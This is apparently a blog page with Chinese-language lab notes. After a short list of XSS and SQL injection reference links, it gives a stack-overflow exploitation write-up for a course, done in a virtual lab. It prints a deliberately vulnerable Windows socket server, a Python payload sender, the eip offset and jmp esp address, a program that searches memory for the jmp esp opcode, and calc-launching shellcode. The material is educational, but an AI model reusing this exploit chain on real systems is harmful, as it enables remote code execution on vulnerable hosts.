<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS 攻击原理 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC</a></p>
<p>XSS 攻击类型方法 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/04e0f8971890">https://www.jianshu.com/p/04e0f8971890</a></p>
<p>level 16 参考链接1 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42111373/article/details/105999963">https://blog.csdn.net/qq_42111373/article/details/105999963</a></p>
<p>level 16 参考链接2 <a target="_blank" rel="noopener" href="https://www.hackersb.cn/hacker/140.html">https://www.hackersb.cn/hacker/140.html</a></p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>SQL 攻击原理 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SQL%E6%B3%A8%E5%85%A5">https://zh.wikipedia.org/wiki/SQL%E6%B3%A8%E5%85%A5</a></p>
<p>数据导出参考1 <a target="_blank" rel="noopener" href="https://blog.csdn.net/nicesa/article/details/106225172">https://blog.csdn.net/nicesa/article/details/106225172</a></p>
<p>数据导出参考2 <a target="_blank" rel="noopener" href="https://lethe.site/2019/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/">https://lethe.site/2019/07/26/SQLi-Labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://lucxer.tk/2020/11/19/XSS&SQL/" data-id="ckja3vkqk001w14lndbu56vwd" data-title="XSS&amp;SQL笔记" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS%E6%94%BB%E5%87%BB/" rel="tag">XSS攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-pwn的初体验" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/12/pwn%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/" class="article-date">
  <time class="dt-published" datetime="2020-11-12T07:11:49.000Z" itemprop="datePublished">2020-11-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%BB%83%E4%B9%A0/">练习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/12/pwn%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/">pwd的初体验</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="0x01-写在前面"><a href="#0x01-写在前面" class="headerlink" title="0x01 写在前面"></a>0x01 写在前面</h1><p>本文就本学期的一门课程《网络攻防技术》的一次作业进行了比较详细的记录，旨在加深对栈溢出过程的原理的理解。限于个人认知有限，文中若有纰漏还请指出批评。本文记录的是一个最基本最简单的栈溢出实例，通过构造payload对一个存在漏洞的服务器进行攻击，从而拿到对方的shell。</p>
<p><strong>使用 <code>msf</code> 一键搞定 or 结合 <code>pwntools</code> 也可以搞定，但不是本文的目的。</strong></p>
<p><strong>同时，希望读者知道有个东西叫做<a target="_blank" rel="noopener" href="http://www.cac.gov.cn/2016-11/07/c_1119867116.htm">《网络安全法》</a>，请勿在未授权的情况下做任何的尝试。本实验仅在搭建的虚拟环境中实施。</strong></p>
<h1 id="0x02-实验背景"><a href="#0x02-实验背景" class="headerlink" title="0x02 实验背景"></a>0x02 实验背景</h1><p>本次实验全部在自己的虚拟机中完成。</p>
<p>攻击机：kali2020</p>
<p>靶机：Lite XP</p>
<p>实验中给定了一个server的c源代码，要求对其进行攻击获取shell。</p>
<h1 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03 实验过程"></a>0x03 实验过程</h1><h2 id="3-1-源码分析"><a href="#3-1-源码分析" class="headerlink" title="3.1 源码分析"></a>3.1 源码分析</h2><p>首先分析存在漏洞的源码，源码文件如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//load windows socket</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;wsock32.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//Define Return Messages</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SS_ERROR 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SS_OK 0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pr</span><span class="params">( <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">500</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,str); <span class="comment">// 未对传入的 str 进行长度判断，直接复制到了 buf中，而buf长度500小于message长度5000，因此这里会溢出。</span></span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sError</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MessageBox (<span class="literal">NULL</span>, str, <span class="string">&quot;socket Error&quot;</span> ,MB_OK);</span><br><span class="line">	WSACleanup();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nServer Start.....\n&quot;</span>);</span><br><span class="line">	WORD sockVersion;</span><br><span class="line">	WSADATA wsaData;</span><br><span class="line">	<span class="keyword">int</span> rVal;</span><br><span class="line">	<span class="keyword">char</span> Message[<span class="number">5000</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">2000</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">	u_short LocalPort;</span><br><span class="line">	LocalPort = <span class="number">50002</span>;</span><br><span class="line"><span class="comment">//wsock32 initialized for usage</span></span><br><span class="line">	sockVersion = MAKEWORD(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">	WSAStartup(sockVersion, &amp;wsaData);</span><br><span class="line"><span class="comment">//create server socket</span></span><br><span class="line">	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(serverSocket == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		sError(<span class="string">&quot;Failed socket()&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> SS_ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	SOCKADDR_IN <span class="built_in">sin</span>;</span><br><span class="line">	<span class="built_in">sin</span>.sin_family = PF_INET;</span><br><span class="line">	<span class="built_in">sin</span>.sin_port = htons(LocalPort);</span><br><span class="line">	<span class="built_in">sin</span>.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line"><span class="comment">//bind the socket</span></span><br><span class="line">	rVal = bind(serverSocket, (LPSOCKADDR)&amp;<span class="built_in">sin</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line">	<span class="keyword">if</span>(rVal == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		sError(<span class="string">&quot;Failed bind()&quot;</span>);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> SS_ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//get socket to listen</span></span><br><span class="line">	rVal = listen(serverSocket, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span>(rVal == SOCKET_ERROR)</span><br><span class="line">	&#123;</span><br><span class="line">		sError(<span class="string">&quot;Failed listen()&quot;</span>);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> SS_ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//wait for a client to connect</span></span><br><span class="line">	SOCKET clientSocket;</span><br><span class="line">	clientSocket = accept(serverSocket, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(clientSocket == INVALID_SOCKET)</span><br><span class="line">	&#123;</span><br><span class="line">		sError(<span class="string">&quot;Failed accept()&quot;</span>);</span><br><span class="line">		WSACleanup();</span><br><span class="line">		<span class="keyword">return</span> SS_ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> bytesRecv = SOCKET_ERROR;</span><br><span class="line">	<span class="keyword">while</span>( bytesRecv == SOCKET_ERROR )</span><br><span class="line">	&#123;</span><br><span class="line"><span class="comment">//receive the data that is being sent by the client max limit to 5000 bytes.</span></span><br><span class="line">		bytesRecv = recv( clientSocket, Message, <span class="number">5000</span>, <span class="number">0</span> );</span><br><span class="line">		<span class="keyword">if</span> ( bytesRecv == <span class="number">0</span> || bytesRecv == WSAECONNRESET )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\nConnection Closed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//Pass the data received to the function pr</span></span><br><span class="line">	pr(Message);</span><br><span class="line"><span class="comment">//close client socket</span></span><br><span class="line">	closesocket(clientSocket);</span><br><span class="line"><span class="comment">//close server socket</span></span><br><span class="line">	closesocket(serverSocket);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> SS_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单分析即可发现在源文件的第15行存在一个漏洞，函数 <code>strcpy</code> 未对复制长度进行限制。从客户端上传是数据最长可以有5000个字节，而函数 <code>pr</code> 中申请的空间只有500个字节，从而存在一个栈的覆盖危险。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119151309098.png" alt="图1 注入点-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119151444721.png" alt="图2 注入点-2"></p>
<h2 id="3-2-windebug-定位溢出点"><a href="#3-2-windebug-定位溢出点" class="headerlink" title="3.2 windebug 定位溢出点"></a>3.2 windebug 定位溢出点</h2><p>在上述分析的基础上还需要定位程序的溢出点在偏移，从而确定shellcode的插入位置。</p>
<p>这里使用 <code>windebug</code> 软件对目标 <code>server</code> 编译的程序进行调试来确定溢出的位置。</p>
<h3 id="3-2-1-生成随机字符串"><a href="#3-2-1-生成随机字符串" class="headerlink" title="3.2.1 生成随机字符串"></a>3.2.1 生成随机字符串</h3><p>利用程序生成一串随机字符串，这个字符串没有什么特殊的地方，仅仅是避免全部填充一样的 <code>A</code> 字符而无法进行定位，这样的随机串重复的概率很低，即可以通过报错的信息定位溢出点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eMoozeSgto1sh5mLovZFX8CRfIyw3INK7eTZrEN5cAd7Bmq02tHzDp2EuPjVFmEcXhzNUMlGDj12MjutSygDnh92zPoqT217646JUW0Kit0XuuYXd0WHMm0Afxuw1Pk59NtFJo7K0UNglb0ZktjWV3V9SFyT2nhI3uAY0Zjg5QqGkVZ8AjAGS2cc9o5aAXX1OYIwHh0LkFsHjt9a67yc9LJDmZ5ZkEZupnDmetxE6itPG5K6RFLxD1hgKUF2uZhuUs8fhcNI2cQWQytTsehNxIC4CFgSWvmIEwGff4YJ0egA4TdznCoOBs4qkUvzVuoLNAiEtdnQdGbpRLhlQr4BKyDdBkIdHWGfOlG9r2pzyVKlOqc04GAM5GyHPjTLxUtXZYLdetkhbyxwkYzC1XX82nFRgeB3iWVWoOQ8h0kQK4Z58HvKOKFXM8S8SBFbcjXkcGzIwvpxlhi3cB0WjyGiiSopFFc6ufamwfGyaehKowXSJa9l9xXAHKPc1sMuRC8RkVUqm2Z3DYNxpSD4dmLdNAFE0F1kpTXXVKYo3jydqPgRXNkmqvy0KSqnLbe1BhIYITgaAQpPmDs6y9xLnbLAS5yUja15Y0smgectWIebHQUJrpElR5dhvgYrnenWhivpbKWVlCyDUrpAbriIk9usAMst5Oj7ytayAGw7qFIZ1W9mhdHScSNjz4sO7pNz</span><br></pre></td></tr></table></figure>


<h3 id="3-2-2-发送字符串"><a href="#3-2-2-发送字符串" class="headerlink" title="3.2.2 发送字符串"></a>3.2.2 发送字符串</h3><p>利用python简单编写一个发送数据的程序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#服务器主机名和端口</span></span><br><span class="line">serverName = <span class="string">&#x27;192.168.195.129&#x27;</span></span><br><span class="line">serverPort = <span class="number">50002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 shellcode</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#客户端创建基于TCP的socket</span></span><br><span class="line">    clientSocket = socket(AF_INET, SOCK_STREAM) </span><br><span class="line"></span><br><span class="line">    <span class="comment">#客户端向服务器发送连接建立请求</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        clientSocket.connect((serverName,serverPort))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;fail to connect.&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送payload</span></span><br><span class="line">    clientSocket.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#客户端关闭TCP连接</span></span><br><span class="line">    clientSocket.close()</span><br></pre></td></tr></table></figure>
<p>然后将上述的随机字符串进行发送。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">b&#x27;eMoozeSgto1sh5mLovZFX8CRfIyw3INK7eTZrEN5cAd7Bmq02tHzDp2EuPjVFmEcXhzNUMlGDj12MjutSygDnh92zPoqT217646JUW0Kit0XuuYXd0WHMm0Afxuw1Pk59NtFJo7K0UNglb0ZktjWV3V9SFyT2nhI3uAY0Zjg5QqGkVZ8AjAGS2cc9o5aAXX1OYIwHh0LkFsHjt9a67yc9LJDmZ5ZkEZupnDmetxE6itPG5K6RFLxD1hgKUF2uZhuUs8fhcNI2cQWQytTsehNxIC4CFgSWvmIEwGff4YJ0egA4TdznCoOBs4qkUvzVuoLNAiEtdnQdGbpRLhlQr4BKyDdBkIdHWGfOlG9r2pzyVKlOqc04GAM5GyHPjTLxUtXZYLdetkhbyxwkYzC1XX82nFRgeB3iWVWoOQ8h0kQK4Z58HvKOKFXM8S8SBFbcjXkcGzIwvpxlhi3cB0WjyGiiSopFFc6ufamwfGyaehKowXSJa9l9xXAHKPc1sMuRC8RkVUqm2Z3DYNxpSD4dmLdNAFE0F1kpTXXVKYo3jydqPgRXNkmqvy0KSqnLbe1BhIYITgaAQpPmDs6y9xLnbLAS5yUja15Y0smgectWIebHQUJrpElR5dhvgYrnenWhivpbKWVlCyDUrpAbriIk9usAMst5Oj7ytayAGw7qFIZ1W9mhdHScSNjz4sO7pNz&#x27;</span></span><br><span class="line">sendPayload(s)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119152047234.png" alt="图3 发送随机串"></p>
<h3 id="3-2-3-windebug-查看报错信息"><a href="#3-2-3-windebug-查看报错信息" class="headerlink" title="3.2.3 windebug 查看报错信息"></a>3.2.3 windebug 查看报错信息</h3><p>生成上述的随机字符串之后，在XP中运行server程序，kali将上述的随机串进行发送，在 <code>windebug</code> 中查看报错的信息。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119152503159.png" alt="图4 windebug调试"></p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119154624072.png" alt="图5 报错信息"></p>
<p>从上述的报错信息中可以看到 <code>eip</code> = 0x754d7331， <code>esp</code> = 0x0012e220。 </p>
<p>简单处理翻译一下，可以知道 <code>eip</code> 的值是 <code>1sMu</code>。（chr(0x75) = ‘u’, chr(0x4d) = ‘M’, chr(0x73) = ‘s’, chr(0x31) = ‘1’） <strong>注意，intel处理器是小端存储，需要反转过来。</strong> 在原来输入串中查找 <code>1sMu</code> 即可找到溢出点偏移。即我们的输入的数据覆盖了 <code>eip</code> 的值，因此可以利用此实现对目标机器的控制。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119155650057.png" alt="图6 确定偏移"></p>
<p>因此这个有效偏移就是 <code>eMoo……HKPc</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eMoozeSgto1sh5mLovZFX8CRfIyw3INK7eTZrEN5cAd7Bmq02tHzDp2EuPjVFmEcXhzNUMlGDj12MjutSygDnh92zPoqT217646JUW0Kit0XuuYXd0WHMm0Afxuw1Pk59NtFJo7K0UNglb0ZktjWV3V9SFyT2nhI3uAY0Zjg5QqGkVZ8AjAGS2cc9o5aAXX1OYIwHh0LkFsHjt9a67yc9LJDmZ5ZkEZupnDmetxE6itPG5K6RFLxD1hgKUF2uZhuUs8fhcNI2cQWQytTsehNxIC4CFgSWvmIEwGff4YJ0egA4TdznCoOBs4qkUvzVuoLNAiEtdnQdGbpRLhlQr4BKyDdBkIdHWGfOlG9r2pzyVKlOqc04GAM5GyHPjTLxUtXZYLdetkhbyxwkYzC1XX82nFRgeB3iWVWoOQ8h0kQK4Z58HvKOKFXM8S8SBFbcjXkcGzIwvpxlhi3cB0WjyGiiSopFFc6ufamwfGyaehKowXSJa9l9xXAHKPc</span><br></pre></td></tr></table></figure>


<h3 id="3-2-4-VC6-debug-确定-esp-无误"><a href="#3-2-4-VC6-debug-确定-esp-无误" class="headerlink" title="3.2.4 VC6 debug 确定 esp 无误"></a>3.2.4 VC6 debug 确定 esp 无误</h3><p>通过F11打开VC6的调试模式，在 <code>pr</code> 函数中printf的地方打上断点，避免程序崩溃。然后运行程序，重复前面的发包，查看 <code>esp</code> = 0x0012e220 地址处的值。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119160020486.png" alt="图8 VC6调试"></p>
<p>可以看到 <code>eip</code> 偏移后面就是 <code>esp</code> 指向的地址。而栈溢出中一个常用的手法就是利用 <code>jmp esp</code> 指令来实现攻击。从上面的分析中，若我们将 <code>1sMu</code> (覆盖 <code>eip</code> 的字符)替换为 <code>jmp esp</code> 指令的地址，将 <code>RC8……</code> (<code>esp</code> 指向的地址)处覆盖为我们的shellcode，<strong>即可完成此次的攻击。</strong></p>
<h2 id="3-3-确定-jmp-esp-指令位置"><a href="#3-3-确定-jmp-esp-指令位置" class="headerlink" title="3.3 确定 jmp esp 指令位置"></a>3.3 确定 jmp esp 指令位置</h2><p>为了执行上述的跳转一个关键步骤就是需要找到一个可以利用的 <code>jmp esp</code> 指令的地址。由于用户端 <code>user32.dll</code> 在一般情况下都必然常驻内存中，因此可以在其中去获取我们需要利用的 <code>jmp esp</code> 的地址。本着不重复造轮子的原则，我随便在网上找了一个可以获取目标机器实时 <code>jmp esp</code> 地址的程序轮子（<strong>侵删</strong>），将其中的查找依赖修改为了 <code>user32.dll</code> ，直接编译运行，点击就送，得到了目标机器上的 <code>jmp esp</code> 的地址为 <code>\x7b\x46\x86\x7c</code>（intel 小端需要反过来）。</p>
<p><img src="https://cdn.jsdelivr.net/gh/LCX666/picgo-blog/img/image-20201119160717744.png" alt="图9 jmp esp位置"></p>
<p>上述的轮子代码如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nRetCode=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">bool</span> we_load_it=<span class="literal">false</span>;</span><br><span class="line">	HINSTANCE h;</span><br><span class="line">	TCHAR dllname[]=_T(<span class="string">&quot;kernel32&quot;</span>);       </span><br><span class="line">	h=GetModuleHandle(dllname);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		h=LoadLibrary(dllname);</span><br><span class="line">		<span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;ERROR LOADING DLL:&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		we_load_it=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE* ptr=(BYTE*)h;</span><br><span class="line">	<span class="keyword">bool</span> done=<span class="literal">false</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> y=<span class="number">0</span>;!done;y++)&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(ptr[y]==<span class="number">0xFF</span>&amp;&amp;ptr[y+<span class="number">1</span>]==<span class="number">0xE4</span>)&#123;</span><br><span class="line">				<span class="keyword">int</span> pos=(<span class="keyword">int</span>)ptr+y;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;OPCODE found at 0x&quot;</span>&lt;&lt;hex&lt;&lt;pos&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(...)&#123;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;END OF&quot;</span>&lt;&lt;dllname&lt;&lt;<span class="string">&quot;MEMORY REACHED&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">			done=<span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(we_load_it)</span><br><span class="line">		FreeLibrary(h);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> nRetCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="3-4-shellcode弹出计算器"><a href="#3-4-shellcode弹出计算器" class="headerlink" title="3.4 shellcode弹出计算器"></a>3.4 shellcode弹出计算器</h2><p>为了检验上述的分析是否正确，可以在正式完成反弹shellcode的编写前完成一个计算器弹出。本着不重复造轮子的原则，我们随便在网上找了一个弹出计算器的shellcode。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x55\x8B\xEC\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8B\xC4\x6A\x05\x50\xB8\xAD\x23\x86\x7C\xFF\xD0\x33\xC0\x50\xB8\xFA\xCA\x81\x7C\xFF\xD0\x8B\xE5\x5D\x33</span><br></pre></td></tr></table></figure>
<p>然后根据前面的分析，只需要将发送的随机字符在合适的位置进行截断，然后拼接 <code>jmp esp</code> 的地址和找到的轮子shellcode。构成最终的payload。然后点击就送，可以发现运行此python脚本之后，服务端就会弹出一个计算器，证明我们的溢出执行指令是可行的。</p>
